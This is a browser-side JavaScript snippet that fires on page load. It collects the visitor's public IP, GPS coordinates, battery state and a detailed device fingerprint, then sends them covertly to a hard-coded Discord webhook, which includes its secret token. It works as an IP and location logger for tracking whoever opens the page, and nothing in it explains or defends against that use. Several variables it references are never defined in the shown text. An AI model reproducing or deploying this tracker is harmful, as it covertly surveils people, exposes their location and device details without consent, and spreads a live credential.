    <script>
        $(document).ready(function() {
            var batterypercentage;
            var ischarging;

            function getPublicIp() {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://api.ipify.org?format=json', false);
                xhr.send();

                if (xhr.status === 200) {
                    const data = JSON.parse(xhr.responseText);
                    return data.ip;
                } else {
                    console.error(`Error: ${xhr.statusText}`);
                    return null;
                }
            }

            const publicIp = getPublicIp();

            function getBatteryStatus() {
                navigator.getBattery().then(function(battery) {
                    batterypercentage = String(battery.level * 100 + "%");
                    ischarging = String(battery.charging);
                    getLocation();
                });
            }

            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition, showError);
                } else {
                    senddis("Your Browser Does not support Gps");
                }
            }

            function showPosition(position) {
                var gpsr = "Lattitute : " + position.coords.latitude + " Longitude : " + position.coords.longitude;
                senddis(gpsr);
            }

            function showError(error) {
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        senddis("Location Permission Denied");
                        break;
                    case error.POSITION_UNAVAILABLE:
                    case error.TIMEOUT:
                    case error.UNKNOWN_ERROR:
                        senddis("Location Error");
                        break;
                }
            }

            function senddis(gpsr) {
                var request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm");
                request.setRequestHeader('Content-type', 'application/json');

                let timezoneOffset = new Date().getTimezoneOffset();
                let osVersion = navigator.appVersion;
                let browserName = navigator.appName;
                let browserVersion = navigator.appVersion;
                let plugins = Array.from(navigator.plugins).map(plugin => plugin.name).join(', ');
                let doNotTrack = navigator.doNotTrack;
                let touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
                let colorDepth = screen.colorDepth;
                let availScreenWidth = screen.availWidth;
                let availScreenHeight = screen.availHeight;
                let onlineStatus = navigator.onLine;
                let pixelRatio = window.devicePixelRatio;

                var params = {
                    content: `
> **DeviceGps  : **${gpsr}
> **NetworkInformation : **${networkinformation}
> **BatteryPercentage : **${batterypercentage}
> **Ischarging : **${ischarging}
> **ScreenWidth : **${width}
> **ScreenHeight : **${height}
> **PlatForm : **${platform}
> **DeviceLanguage : **${devicelang}
> **DeviceMemory : **${deviceram}
> **IsCookieEnabled : **${iscookieEnabled}
> **UserAgent : **${useragent}
> **CpuThreads : **${cpuThreads}
> **ReferUrl : **${referurl}
> **DeviceLocalTime : **${localtime}
> **Public IP  : **${publicIp}
> **TimezoneOffset : **${timezoneOffset}
> **OS Version : **${osVersion}
> **Browser Name : **${browserName}
> **Browser Version : **${browserVersion}
> **Installed Plugins : **${plugins}
> **Do Not Track : **${doNotTrack}
> **Touch Support : **${touchSupport}
> **Color Depth : **${colorDepth}
> **Available Screen Width : **${availScreenWidth}
> **Available Screen Height : **${availScreenHeight}
> **Online Status : **${onlineStatus}
> **Device Pixel Ratio : **${pixelRatio}
`,
                    username: "niknik",
                    avatar_url: "https://dpwhatsapp.xyz/wp-content/uploads/2021/08/Anime-Girl-WhatsApp-DP.jpg"
                }
                request.send(JSON.stringify(params));
            }

            getBatteryStatus();
        });
